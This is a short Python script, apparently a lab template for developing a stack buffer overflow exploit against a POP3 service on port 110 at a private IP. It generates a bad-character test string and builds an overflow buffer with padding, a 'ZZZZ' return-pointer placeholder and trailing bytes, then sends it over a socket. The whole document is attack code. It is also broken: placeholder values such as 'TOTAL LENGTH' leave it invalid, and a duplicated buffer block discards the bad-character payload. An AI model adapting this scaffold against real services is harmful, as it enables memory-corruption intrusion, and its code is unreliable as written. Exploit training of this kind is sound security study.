#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

data = s.recv(1024)

badchar_test = "" #start with empty string

#determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program

badchars = [0x00, 0x0A, 0x0D]  

#generate the string using a for loop 
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars: #skip the badchars
		badchar_test += chr(i) #append each non-badchar char to the string.

#open a file for writing ('w') the string as binary ('b') data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

buf_totlen=TOTAL LENGTH
offset_srp = OFFSET

buf = ""
buf += "A"*(offset_srp - len(buf)) #padding
buf += "ZZZZ"
buf += badchar_test #ESP points here
buf += "C"*(buf_totlen - len(buf)) #trailing padding
buf += "\n"

#build a message

buf_totlen= TOTAL LENGTH
offset_srp = OFFSET NUMBER

buf = ""
buf += "A"*(offset_srp - len(buf)) #padding
buf += "ZZZZ"
buf += "C"*(buf_totlen - len(buf)) #trailing padding
buf += "\n"

#send the message
s.send("VALUE" + buf)

#receive some data from socket
data = s.recv(1024)

s.close()
